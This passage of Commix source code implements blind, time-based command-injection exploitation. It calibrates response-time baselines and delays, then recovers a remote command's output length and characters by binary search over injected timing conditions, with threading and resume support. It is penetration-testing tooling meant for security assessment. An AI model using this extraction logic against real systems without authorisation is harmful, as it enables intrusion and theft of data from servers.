#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import time
import string
import random
import threading
try:
  import concurrent.futures
  _THREADS_SUPPORTED = True
except ImportError:
  # "concurrent.futures" needs Python 3.2+; fall back to serial on Python 2.
  _THREADS_SUPPORTED = False
from src.core.parse import cmdline as menu
from src.utils import settings
from src.core.requests import requests
from src.core.requests import stability
from src.utils import common
from src.core.controller import checks
from src.core.controller import execution
from src.utils import session_handler
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import html_parser as _html_parser

"""
Abort the thread pool on SystemExit; KeyboardInterrupt is handled by the caller.
"""
def _abort_executor(executor, exc):
  executor.shutdown(wait=False, cancel_futures=True)
  os._exit(exc.code if isinstance(exc.code, int) else 0)

"""
The main time-realative command injection exploitation.
"""
"""
How many output positions a time-related retrieval resolves at once.
"""
def retrieval_concurrency():
  if settings.THREADS > 1 and _THREADS_SUPPORTED and settings.THREADED_TIME_RETRIEVAL_CHOICE != False:
    return settings.THREADS
  return 1

# Retrieve a command's output from a target that answers only by how long it takes.
def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):

  payloads = execution.select_payloads_module(technique)

  if settings.TARGET_OS == settings.OS.WINDOWS:
    cmd, previous_cmd = execution.windows_transform_cmd(cmd, technique, interpreter)

  if menu.options.file_write:
    minlen = 0
  else:
    minlen = 1

  if settings.CALIBRATED_TIMESEC is not None:
    timesec = settings.CALIBRATED_TIMESEC

  found_chars = False
  # Retrieving a user command's output is exploitation, even when the finding was resumed.
  settings.DETECTION_PHASE = False
  settings.EXPLOITATION_PHASE = True
  settings.INCOMPLETE_OUTPUT = False
  # Warn about network load once before the first command that needs it.
  checks.time_related_attaks_msg()
  checks.warm_up_response_baseline(url, http_request_method)

  if settings.EXPLOITATION_PHASE and settings.ADJUST_TIME_DELAY_CHOICE is None:
    msg = "Do you want commix to try to optimize the value(s) for delay responses (option '--time-sec')? [Y/n] "
    settings.ADJUST_TIME_DELAY_CHOICE = common.read_input(msg, default="Y", check_batch=True) in settings.CHOICE_YES

  # An interrupted prior run's partial value carries an already-confirmed length.
  _stored_partial = None
  if not menu.options.ignore_session:
    _candidate = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
    if _candidate is not None and _candidate.startswith(settings.PARTIAL_VALUE_MARKER):
      _stored_partial = _candidate
  _cached_length = None
  if _stored_partial is not None:
    try:
      _cached_length = int(_stored_partial[len(settings.PARTIAL_VALUE_MARKER):].split(":", 1)[0])
    except ValueError:
      _cached_length = None

  # The length and character payloads read their value off a PowerShell on the target, and its
  # first launch is served cold - tens of seconds, where every one after it costs about a second.
  # Measured, that start reads as a delay the payload never asked for, and recorded, it widens the
  # model every later comparison is judged against. Paid once here, before either can happen.
  def _warm_up_target_shell():
    if settings.TARGET_OS != settings.OS.WINDOWS:
      return
    safe_candidate = int(maxlen) * 2 + 100
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      probe = payloads.get_length(separator, cmd, safe_candidate, timesec, http_request_method)
    else:
      probe = payloads.cmd_execution(separator, cmd, safe_candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
    if not probe:
      return
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Warming up the target's shell, so that its first start is not measured."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    try:
      requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
    except KeyboardInterrupt:
      checks.handle_exploitation_interrupt(filename, url)
    except Exception:
      pass

  # Sample how long the target takes to answer when nothing is asking it to wait.
  def _warm_up_baseline(announce=True):
    fan_out = retrieval_concurrency()
    # A model of responses asked for one at a time says nothing about how the target answers while
    # it is serving several: those take longer, and every one of them then reads as a delay the
    # payload never asked for - which is how a character resolves to a value above the real one.
    # Sampled again here, the way every probe after it is sent.
    if fan_out > 1 and not settings.CONCURRENT_BASELINE:
      settings.CONCURRENT_BASELINE = True
      del settings.RESPONSE_TIMES[:]
    # What a probe costs is a property of the command being asked, so the previous one's sample is
    # dropped rather than left to answer for this one.
    del settings.PROBE_RESPONSE_TIMES[:]
    # Each model is filled from its own kind of request: the probes below cannot stand in for plain
    # ones, and pooling them is what lifts the threshold above the delay it is meant to catch.
    # Left open, so that the dots below carry on under the same line rather than a second warning
    # being written over the first and both of them claiming to be done.
    announced = checks.warm_up_response_baseline(url, http_request_method, close=False)
    if len(settings.PROBE_RESPONSE_TIMES) < settings.MIN_PROBE_RESPONSES:
      # Silent where the caller has just said what it is taking the model again for: the dots
      # carry on under that line instead of repeating it.
      if announce and not announced:
        warn_msg = settings.TIMING_BASELINE_MSG
        warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
        # The open line says what is being tested, so it is closed rather than written over - and
        # this one is left open in its turn, for the dots below to be counted off on it.
        settings.close_progress_line()
        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))

      # One sample, taken with a condition that cannot hold, so no delay is asked for.
      def _probe():
        safe_candidate = int(maxlen) * 2 + 100
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          probe = payloads.get_length(separator, cmd, safe_candidate, timesec, http_request_method)
        else:
          probe = payloads.cmd_execution(separator, cmd, safe_candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
        exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
        checks.record_probe_response_time(exec_time)
        # Skip dots in verbose mode; payload debug lines already show progress.
        if settings.VERBOSITY_LEVEL == 0:
          settings.print_data_to_stdout(".")

      # Bounded, and the workers' own failures are re-raised: nothing waits on their results
      # otherwise, so a probe that raises every time leaves this asking the target forever.
      probe_rounds = 0
      max_probe_rounds = settings.MIN_PROBE_RESPONSES * 2
      while len(settings.PROBE_RESPONSE_TIMES) < settings.MIN_PROBE_RESPONSES and probe_rounds < max_probe_rounds:
        probe_rounds += 1
        try:
          if fan_out > 1:
            with concurrent.futures.ThreadPoolExecutor(max_workers=fan_out) as executor:
              for future in [executor.submit(_probe) for _ in range(fan_out)]:
                future.result()
          else:
            _probe()
        except KeyboardInterrupt:
          checks.handle_exploitation_interrupt(filename, url)
      if settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")
    elif announced and settings.VERBOSITY_LEVEL == 0:
      # Nothing more to sample, but the line the warm-up opened is still waiting to be closed.
      settings.print_data_to_stdout(" (done)")

  # Note a target that has started answering late of its own accord.
  def _check_lagging():
    nonlocal length_suspect, lagging_detected
    if checks.check_lagging():
      length_suspect = lagging_detected = True

  # A delay the target's own answers already take is no delay at all - both come back late and the
  # comparison behind them cannot be read either way. Raised to clear the model before the first
  # measurement, rather than after a search has spent its requests on answers that all look alike.
  # Under '--threads' this is what the concurrency costs: several requests at once are served
  # slower than one, so the delay that told them apart on a quiet target no longer does.
  # The next delay to try after an answer could not be read: the measured requirement where that is
  # higher than a single step, since a payload whose own work varies by seconds is never caught up
  # with one second at a time.
  def _escalated_delay(current):
    needed = _needed_delay()
    stepped = current + settings.TIME_DELAY_STEP
    return max(stepped, needed) if needed is not None else stepped

  # The delay that would stand above the target's own answers, as the model has them so far.
  def _needed_delay():
    threshold = checks.current_delay_threshold()
    return None if threshold is None else int(threshold) + 1 + settings.TIME_DELAY_STEP

  # Give up the concurrency and take the model again without it, so that what follows is judged
  # against the way the requests are now sent.
  def _fall_back_to_single_thread(reason):
    warn_msg = reason + " Continuing with a single thread"
    warn_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
    # Whatever was printed last is ended first: the carriage return below returns to the start of
    # the line, and would otherwise write this message over it. Left open after that, so the dots of
    # the model being taken again carry on under this line.
    settings.close_progress_line()
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
    settings.THREADED_TIME_RETRIEVAL_CHOICE = False
    settings.CONCURRENT_BASELINE = False
    del settings.RESPONSE_TIMES[:]
    _warm_up_baseline(announce=False)

  # Raise the delay until it stands clear of the target's own response times.
  def _raise_delay_above_baseline():
    nonlocal timesec
    needed = _needed_delay()
    if needed is None or needed <= timesec:
      return
    # Every probe of every character would pay that longer delay, which is more than the threads
    # save - so where they are what made the answers slow, they go instead of the delay growing.
    if retrieval_concurrency() > 1:
      _fall_back_to_single_thread("Concurrent requests would need a longer delay on every probe.")
      needed = _needed_delay()
      if needed is None or needed <= timesec:
        return
    timesec = settings.CALIBRATED_TIMESEC = needed
    warn_msg = "Raising the time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "")
    warn_msg += ", so that it stands above the target's own response times."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

  # Guard timesec so concurrent payloads use the same value for sending and validation.
  timesec_lock = threading.Lock()

  delay_candidates = [0] * settings.TIME_DELAY_CANDIDATES
  # Lower the delay again where the target has been answering promptly all along.
  def _adjust_time_delay(exec_time, lower_limit):
    nonlocal timesec
    # Never while several requests are in flight. The limit behind this is measured on answers that
    # were not held back, while most of the probes around them are - and a request that waits its
    # turn behind those comes back as late as one that was delayed on purpose. Lowered on the
    # strength of the quick answers, the delay stops standing out from the slow ones at all.
    if settings.THREADS > 1:
      return
    if settings.ADJUST_TIME_DELAY_DISABLED or settings.ADJUST_TIME_DELAY_CHOICE == False:
      return
    # Never below the floor 'time_related_timesec()' holds every other caller to, or the
    # delay is shortened past the point the payload's own cost can be told apart from it.
    candidate = max(settings.TIME_DELAY_STEP + int(round(lower_limit)), checks.min_safe_timesec())
    with timesec_lock:
      delay_candidates.insert(0, candidate)
      del delay_candidates[settings.TIME_DELAY_CANDIDATES:]
      if len(set(delay_candidates)) == 1 and candidate < timesec:
        if exec_time / (1.0 * timesec / candidate) > settings.MIN_VALID_DELAYED_RESPONSE:
          timesec = settings.CALIBRATED_TIMESEC = candidate
          info_msg = "Adjusting time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "") + " due to good response times."
          settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  # Track clean runs to resume auto-adjustment after a raised delay.
  def _note_validation_result(retried):
    with timesec_lock:
      if retried:
        settings.VALIDATION_RUN = 0
        return
      settings.VALIDATION_RUN += 1
      if settings.ADJUST_TIME_DELAY_DISABLED and settings.VALIDATION_RUN > settings.VALID_TIME_CHARS_RUN_THRESHOLD:
        settings.ADJUST_TIME_DELAY_DISABLED = False
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Turning back on the time delay auto-adjustment mechanism."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  length_suspect = False
  lagging_detected = False

  # Measure once with retries and the shared adaptive delay model for both techniques.
  def _measure_length(payload):
    nonlocal length_suspect
    exec_time = 0
    errors_before = settings.VISIBLE_CONNECTION_ERRORS
    for attempt in range(5):
      before = stability.requests_sent()
      exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      if not stability.request_was_retried(before):
        break
    if settings.VISIBLE_CONNECTION_ERRORS != errors_before:
      length_suspect = True
    decision = checks.time_related_shell(exec_time, timesec)
    if not decision:
      checks.record_probe_response_time(exec_time)
    else:
      lower_limit = checks.current_delay_threshold()
      if lower_limit is not None:
        _adjust_time_delay(exec_time, lower_limit)
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(".")
    return decision

  # Told apart by the difference between a condition that must hold and one that cannot, rather
  # than by a threshold: the payload's own work counts for seconds of its own on a slow target.
  # Where the two are indistinguishable, every comparison reads as true and the search would settle
  # on '--maxlen' and then extract that many characters of noise.
  def _oracle_holds():
    # How long the target takes to answer a question about the output's length.
    def _probe_time(candidate):
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        probe = payloads.get_length(separator, cmd, candidate, timesec, http_request_method)
      else:
        probe = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
      if not probe:
        return None
      # No progress dot of its own: this runs before the retrieval line is printed, where a dot
      # would sit on its own under the last prompt.
      exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
      return exec_time

    impossible = int(maxlen) * 2 + 100
    for _ in range(settings.FALSE_POSITIVE_RETRIES):
      try:
        cannot_hold = _probe_time(impossible)
        must_hold = _probe_time(int(minlen))
      except KeyboardInterrupt:
        checks.handle_exploitation_interrupt(filename, url)
      if cannot_hold is None or must_hold is None:
        return True
      checks.record_probe_response_time(cannot_hold)
      if must_hold - cannot_hold >= checks.injected_delay(timesec) / 2.0:
        return True
    return False

  """
  Whether the target still delays for a condition that holds whatever the command answered.

  Asked only once the oracle has failed, and it separates the two reasons it can fail: a delay that
  no longer stands out from the target's own answers, and a command whose output is empty - where
  every question about the length of that output is correctly answered "no".
  """
  def _delay_still_observable():
    probe = payloads.condition_check(separator, "1 -eq 1", timesec, http_request_method)
    if not probe:
      return None
    try:
      exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, probe, vuln_parameter, http_request_method, url)
    except KeyboardInterrupt:
      checks.handle_exploitation_interrupt(filename, url)
      return None
    return checks.time_related_shell(exec_time, timesec)

  # Whether the answers can still be told apart while several requests are in flight - asked of the
  # target rather than inferred from a model of it. One probe whose condition cannot hold, and so
  # cannot ask for a delay, is sent alongside the others that do ask for one: if even that one comes
  # back looking late, then so does everything the retrieval is about to compare. Every round has to
  # be told apart, because a retrieval makes thousands of those comparisons and reads a character
  # wrong on any one of them. Returns how late such an answer was, or None where none of them were.
  def _confounded_by_threads(workers):
    impossible = int(maxlen) * 2 + 100
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      quick = payloads.get_length(separator, cmd, impossible, timesec, http_request_method)
      slow = payloads.get_length(separator, cmd, int(minlen), timesec, http_request_method)
    else:
      quick = payloads.cmd_execution(separator, cmd, impossible, OUTPUT_TEXTFILE, timesec, http_request_method)
      slow = payloads.cmd_execution(separator, cmd, int(minlen), OUTPUT_TEXTFILE, timesec, http_request_method)
    if not quick or not slow:
      return None

    # One request whose only purpose is to occupy the target while another is timed.
    def _hold_answer_back():
      # The point of these is the load they put on the target, not what they come back with.
      threading.current_thread().commix_suppress_output = True
      try:
        requests.perform_injection(prefix, suffix, whitespace, slow, vuln_parameter, http_request_method, url)
      except Exception:
        pass

    exec_time = 0
    for _ in range(settings.FALSE_POSITIVE_RETRIES):
      try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
          for _ in range(workers - 1):
            executor.submit(_hold_answer_back)
          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, quick, vuln_parameter, http_request_method, url)
      except KeyboardInterrupt:
        checks.handle_exploitation_interrupt(filename, url)
      if checks.time_related_shell(exec_time, timesec):
        return exec_time
    return None

  # Raising the delay instead would cost every probe of every character what the concurrency saves.
  def _drop_threads_if_timing_unsafe():
    workers = retrieval_concurrency()
    if workers <= 1 or not _THREADS_SUPPORTED:
      return
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Checking whether answers can still be told apart with " + str(workers)
      debug_msg += " requests in flight."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    exec_time = _confounded_by_threads(workers)
    if exec_time is None:
      return
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "An answer that asked for no delay still took " + str(round(exec_time, 1))
      debug_msg += " seconds while " + str(workers - 1) + " other request"
      debug_msg += ("s" if workers > 2 else "") + " waited on the target."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    _fall_back_to_single_thread("Concurrent requests make every answer look delayed on this target.")

  _warm_up_target_shell()
  _warm_up_baseline()
  _drop_threads_if_timing_unsafe()
  _check_lagging()
  _raise_delay_above_baseline()

  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking that a delayed answer can be told apart from an ordinary one."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  if not _oracle_holds():
    if _delay_still_observable():
      # The delay is there for a condition that does not ask about the output, and gone for every
      # one that does - so the command answered nothing, and there is no length to look for.
      err_msg = "The '" + str(cmd) + "' command produced no output on the target."
    else:
      err_msg = "Delayed and ordinary answers cannot be told apart, so the output length cannot be "
      err_msg += "measured. Try a higher '--time-sec'"
      if retrieval_concurrency() > 1:
        err_msg += ", fewer '--threads'"
      err_msg += ", or a less loaded network."
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_critical_msg(err_msg))
    return 0, ""

  # Close the warm-up dots line before starting a new spinner line.
  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)

  output_length = None
  if _cached_length is not None:
    output_length = _cached_length
    found_chars = True
    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and not interpreter:
      # Convert leftover raw file output to decimal before extraction starts.
      payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
      _measure_length(payload)
    info_msg = "Reusing the previously retrieved output length: " + str(output_length)
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  else:
    info_msg = "Retrieving the length of execution output"
    if settings.TEMPFILE_BASED_STATE:
      info_msg += " from file '" + OUTPUT_TEXTFILE + "'"
    info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

    if not (technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and interpreter):
      # Binary search the output length, mirroring _bisect_once() below.
      def _length_delayed(candidate):
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          if interpreter:
            payload = payloads.get_length_alter_interpreter(separator, cmd, candidate, timesec, http_request_method)
          else:
            payload = payloads.get_length(separator, cmd, candidate, timesec, http_request_method)
        else:
          payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
        return _measure_length(payload)

      """
      One wrong answer sends the search into the wrong half, so a step is worth confirming - but
      only where a wrong answer is on the cards. Until the timing has actually been seen to wobble,
      a second probe of a step costs another whole delay to be told what the first one said, and
      the answer the search settles on is re-checked afterwards either way. Once jitter has been
      seen, every step is answered twice, and a third time to break a tie.
      """
      def _length_delayed_confirmed(candidate):
        first = _length_delayed(candidate)
        if not settings.JITTER_SEEN:
          return first
        if first == _length_delayed(candidate):
          return first
        return _length_delayed(candidate)

      # Find the length of the output, by bracketing it and then halving the bracket.
      def _bisect_length():
        lo = int(minlen) - 1
        hi = None
        # Doubling first, so the bracket is found among plausible lengths. Starting at '--maxlen'
        # instead would let one late answer settle the search on the upper bound.
        candidate = max(1, int(minlen))
        while candidate < int(maxlen):
          try:
            if not _length_delayed_confirmed(candidate):
              hi = candidate
              break
            lo = candidate
            candidate = candidate * 2
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
        if hi is None:
          hi = int(maxlen)
        # A single value to find, nothing to distribute across threads - stays serial.
        while hi - lo > 1:
          try:
            mid = (lo + hi) // 2
            if _length_delayed_confirmed(mid):
              lo = mid
            else:
              hi = mid
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
        return lo if lo >= int(minlen) else None

      output_length = _bisect_length()

      if output_length is not None:
        # Whether a length is the answer: it must hold, and the next one up must not.
        def _boundary_holds(candidate):
          if not _length_delayed(candidate):
            return False
          # The next length up must not hold. Without that negative half, a target that answers
          # late whatever it is asked has its upper bound accepted as the answer.
          if _length_delayed(candidate + 1):
            return False
          return True

        # Read the length back a second way, where the technique can be asked for it directly.
        def _exact_length_confirmed(candidate):
          if technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
            return True
          payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method, operator="-eq")
          return _measure_length(payload)

        """
        Best-of-3 vote once jitter has been seen, for a stronger guarantee. A single pass is enough
        while the timing is clean: it already asks in both directions, and a wobble would have to
        fall the right way twice over to be mistaken for an answer.
        """
        def _validate_boundary(candidate):
          if settings.JITTER_SEEN:
            votes = [_boundary_holds(candidate) for _ in range(3)]
            same_mechanism_ok = votes.count(True) >= 2
          else:
            same_mechanism_ok = _boundary_holds(candidate)
          return same_mechanism_ok and _exact_length_confirmed(candidate)

        revalidations = 0
        original_timesec = timesec
        while True:
          try:
            validated = _validate_boundary(output_length)
          except KeyboardInterrupt:
            checks.handle_exploitation_interrupt(filename, url)
            continue
          if validated:
            break
          was_jittery = settings.JITTER_SEEN
          settings.JITTER_SEEN = True
          settings.ADJUST_TIME_DELAY_DISABLED = True
          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
          if revalidations >= max_revalidations:
            length_suspect = True
            timesec = settings.CALIBRATED_TIMESEC = original_timesec
            break
          revalidations += 1
          settings.print_data_to_stdout(settings.print_error_msg("Invalid length detected. Retrying.."))
          if settings.ADJUST_TIME_DELAY_CHOICE != False:
            timesec = settings.CALIBRATED_TIMESEC = _escalated_delay(timesec)
            warn_msg = "Increasing time delay to " + str(timesec) + " second" + ("s" if timesec > 1 else "") + "."
            settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          output_length = _bisect_length()
          if output_length is None:
            length_suspect = True
            break
        _note_validation_result(revalidations > 0)

      if output_length is not None:
        found_chars = True
        if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
          _length_delayed(output_length)
    else:
      # Experimental interpreter path only - its oracle is still exact-match, not bisectable.
      for candidate_length in range(int(minlen), int(maxlen)):
        payload = payloads.cmd_execution_alter_interpreter(separator, cmd, candidate_length, OUTPUT_TEXTFILE, timesec, http_request_method)
        if _measure_length(payload):
          output_length = candidate_length
          found_chars = True
          break

    if settings.VERBOSITY_LEVEL == 0 and found_chars:
      settings.print_data_to_stdout(" (done)")

  if length_suspect:
    warn_msg = "The detected output length may be unreliable due to connection instability. Consider re-running to confirm it."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

  if _cached_length is None and found_chars == True and output_length > 1:
    info_msg = "Retrieved length: " + str(output_length)
    settings.print_data_to_stdout(settings.print_info_msg(info_msg))

  # Every character costs its own requests, so a long output is worth confirming first.
  if found_chars == True and output_length > settings.LARGE_OUTPUT_THRESHOLD:
    workers = retrieval_concurrency()
    message = "The output is " + str(output_length) + " characters long and is recovered "
    message += "one character at a time" if workers == 1 else str(workers) + " characters at a time"
    message += ". Do you want to retrieve it? [Y/n] "
    if common.read_input(message, default="Y", check_batch=True) not in settings.CHOICE_YES:
      warn_msg = "Skipping the retrieval of " + str(output_length) + " characters."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      return 0, ""

  # Proceed with the next (injection) step!
  if found_chars == True :
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = previous_cmd
    num_of_chars = output_length + 1
    check_start = 0
    check_end = 0
    check_start = time.time()
    output = []
    # Position -> resolved ordinal (>= 0), shared by both loops; -1 marks "attempted, no delay found".
    UNRESOLVED_POSITION = -1
    results_by_position = {}
    failed_positions = set()
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      base_progress_msg = "Retrieving the execution output."
    else:
      base_progress_msg = "Retrieving the execution output from file '" + OUTPUT_TEXTFILE + "'."
    if settings.VERBOSITY_LEVEL == 0 :
      info_msg = base_progress_msg.rstrip(".") + ": "
    else:
      info_msg = base_progress_msg + settings.END_LINE.LF
    # Skip when resuming; _load_partial_progress() prints the resume header and progress line.
    if output_length > 1 and _cached_length is None:
      settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

    observed_chars = set()
    observed_count = [0]
    char_frequency = {}
    observed_chars_lock = threading.Lock()

    # Renders positions resolved so far, order-independent: "_" not attempted, "?" no delay found.
    def _render_output_so_far():
      furthest = 0
      chars = []
      for pos in range(1, output_length + 1):
        ascii_char = results_by_position.get(pos)
        if ascii_char == UNRESOLVED_POSITION:
          chars.append("?")
          furthest = pos
        elif ascii_char is not None:
          ch = chr(ascii_char)
          chars.append(ch if ch.isprintable() else " ")
          furthest = pos
        else:
          chars.append("_")
      if furthest == 0:
        return ""
      width = settings.PROGRESS_DISPLAY_WIDTH
      start = max(1, furthest - width + 1)
      text = "".join(chars[start - 1:furthest])
      if start > 1:
        text = ".." + text[2:]
      if furthest - start + 1 == width and furthest < output_length:
        text = text[:-2] + ".."
      return text

    # Rewrite the progress line with the characters resolved so far.
    def _print_progress():
      if settings.VERBOSITY_LEVEL == 0:
        progress_msg = base_progress_msg.rstrip(".") + ": " + _render_output_so_far()
        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(progress_msg))

    # Pre-populates results_by_position from an interrupted prior run's partial value.
    def _load_partial_progress():
      if _stored_partial is None:
        return
      body = _stored_partial[len(settings.PARTIAL_VALUE_MARKER):]
      try:
        stored_length, pairs = body.split(":", 1)
        if int(stored_length) != output_length:
          return
        for pair in pairs.split(","):
          if not pair:
            continue
          pos_str, ord_str = pair.split("=")
          results_by_position[int(pos_str)] = int(ord_str)
      except ValueError:
        return
      if results_by_position:
        info_msg = "Resuming the previously interrupted extraction (" + str(len(results_by_position)) + "/" + str(output_length) + " character(s) already retrieved)."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
        _print_progress()

    # Persists progress so far, partial unless every position is done - called
    # before any interrupt-triggered exit.
    def _save_progress():
      if menu.options.ignore_session:
        return
      resolved = dict((pos, ordinal) for pos, ordinal in results_by_position.items()
                      if ordinal is not None and ordinal != UNRESOLVED_POSITION)
      if len(resolved) >= len(positions):
        value = "".join(chr(resolved[pos]) for pos in positions)
      else:
        pairs = ",".join(str(pos) + "=" + str(ordinal) for pos, ordinal in sorted(resolved.items()))
        value = settings.PARTIAL_VALUE_MARKER + str(output_length) + ":" + pairs
      session_handler.store_cmd(url, cmd, value, vuln_parameter)

    # Resolve one character of the output, by halving the range its value lies in.
    def _bisect_once(num_of_chars, char_pool):
      nonlocal timesec
      # Binary search over the character's ordinal value.
      min_ord = min(char_pool)
      max_ord = max(char_pool)
      conn_error_flag = False

      # Whether the target waits when asked if this character is at or below a value.
      def _char_delayed(candidate, operator="-le"):
        nonlocal conn_error_flag
        with timesec_lock:
          local_timesec = timesec
        payload = payloads.get_char(separator, cmd, num_of_chars, candidate, local_timesec, http_request_method, operator=operator) if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
        exec_time = 0
        errors_before = settings.VISIBLE_CONNECTION_ERRORS
        for attempt in range(5):
          before = stability.requests_sent()
          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
          if not stability.request_was_retried(before):
            break
        if settings.VISIBLE_CONNECTION_ERRORS != errors_before:
          conn_error_flag = True
        decision = checks.time_related_shell(exec_time, local_timesec)
        if not decision:
          checks.record_probe_response_time(exec_time)
        else:
          lower_limit = checks.current_delay_threshold()
          if lower_limit is not None:
            _adjust_time_delay(exec_time, lower_limit)
        return decision

      # The halving itself, over the ordinals the character can still be.
      def _bisect_chars(force_full=False):
        lo = min_ord - 1
        hi = max_ord
        # Confirm the fast path twice; threaded mode re-raises so only the main thread prompts.
        while True:
          try:
            if _char_delayed(hi) and _char_delayed(hi):
              """
              And ask something that cannot be true. A target answering late to everything agrees
              to this shortcut for every position, and the equality check that follows agrees too,
              being just as saturated - so the whole output resolves to the pool's last character.
              A control that comes back delayed says the timing, not the byte, is doing the talking.
              """
              if _char_delayed(hi + 1):
                return None, True
              return hi, True
            break
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)

        if not force_full:
          with observed_chars_lock:
            top_candidates = sorted(char_frequency, key=char_frequency.get, reverse=True)[:settings.FREQUENCY_PROBE_TOP_K]
          saturated = False
          for candidate in top_candidates:
            while True:
              try:
                if _char_delayed(candidate, operator="-eq"):
                  # Reject a saturated oracle: a value that cannot match must come back undelayed.
                  if not (threaded or settings.JITTER_SEEN):
                    return candidate, False
                  control = candidate + 1 if candidate < max(char_pool) else min(char_pool)
                  if not _char_delayed(control, operator="-eq"):
                    return candidate, False
                  saturated = True
                break
              except KeyboardInterrupt:
                if threaded:
                  raise
                checks.handle_exploitation_interrupt(filename, url)
            if saturated:
              break

          with observed_chars_lock:
            eligible = (observed_count[0] >= settings.NARROWING_MIN_OBSERVED
                        and len(observed_chars) <= settings.NARROWING_MAX_SET_SIZE)
            narrowed = sorted(observed_chars) if eligible else None
          if narrowed:
            # Binary-search the narrowed set by index; keep hi as an exclusive sentinel.
            nlo, nhi = -1, len(narrowed)
            while nhi - nlo > 1:
              try:
                nmid = (nlo + nhi) // 2
                if _char_delayed(narrowed[nmid]):
                  nlo = nmid
                else:
                  nhi = nmid
              except KeyboardInterrupt:
                if threaded:
                  raise
                checks.handle_exploitation_interrupt(filename, url)
            if nlo >= 0:
              # The value may be outside this set; boundary validation catches and escalates misses.
              return narrowed[nlo], False

        while hi - lo > 1:
          try:
            mid = (lo + hi) // 2
            if _char_delayed(mid):
              lo = mid
            else:
              hi = mid
          except KeyboardInterrupt:
            if threaded:
              raise
            checks.handle_exploitation_interrupt(filename, url)
        return (lo, True) if lo >= min_ord else (None, True)

      ascii_char, from_full_range = _bisect_chars()

      """
      A position that produced no delay anywhere is the case the escalation below exists for: the
      delay may be too short for this target, or the threshold too high to notice it. Answered with
      nothing and left out of that loop, it got no second chance at all, while a position that
